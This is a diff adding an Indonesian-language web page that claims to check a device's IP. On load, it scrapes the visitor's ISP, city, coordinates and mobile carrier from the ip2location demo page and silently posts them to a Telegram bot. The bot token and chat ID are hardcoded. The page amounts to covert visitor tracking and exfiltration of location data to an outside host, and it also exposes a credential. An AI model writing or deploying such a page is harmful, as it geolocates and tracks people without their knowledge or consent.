@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Cek IP Perangkat</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+</head>
+<body>
+  <h1>Cek IP Perangkat</h1>
+
+  <script>
+    // Fungsi untuk mengirim pesan ke bot Telegram
+    function sendMessageToTelegram(message) {
+      var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+      var chatId = '1121369247';
+
+      // Buat URL untuk mengirim pesan menggunakan bot Telegram
+      var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
+      var data = {
+        chat_id: chatId,
+        text: message
+      };
+
+      // Kirim permintaan POST ke API Telegram
+      $.post(url, data, function(response) {
+        console.log('Pesan berhasil dikirim ke Telegram');
+      });
+    }
+
+    // Fungsi untuk mendapatkan informasi IP perangkat
+    function getDeviceInfo() {
+      // Buat permintaan GET ke halaman demo ip2location
+      $.get('https://www.ip2location.com/demo/', function(response) {
+        // Cari elemen-elemen dengan class 'result' pada halaman web
+        var result = $(response).find('.result');
+
+        // Ambil nilai-nilai yang diperlukan dari elemen-elemen tersebut
+        var isp = result.eq(1).text().trim();
+        var country = result.eq(2).text().trim();
+        var region = result.eq(3).text().trim();
+        var city = result.eq(4).text().trim();
+        var coordinates = result.eq(5).text().trim();
+        var localTime = result.eq(6).text().trim();
+        var domain = result.eq(7).text().trim();
+        var netSpeed = result.eq(8).text().trim();
+        var mobileCarrier = result.eq(9).text().trim();
+
+        // Format pesan yang akan dikirim ke bot Telegram
+        var message = `
+          ISP: ${isp}
+          Country: ${country}
+          Region: ${region}
+          City: ${city}
+          Coordinates of City: ${coordinates}
+          Local Time: ${localTime}
+          Domain: ${domain}
+          Net Speed: ${netSpeed}
+          Mobile Carrier: ${mobileCarrier}
+        `;
+
+        // Kirim pesan ke bot Telegram
+        sendMessageToTelegram(message);
+      });
+    }
+
+    // Panggil fungsi getDeviceInfo saat halaman selesai dimuat
+    $(document).ready(function() {
+      getDeviceInfo();
+    });
+  </script>
+</body>
+</html>
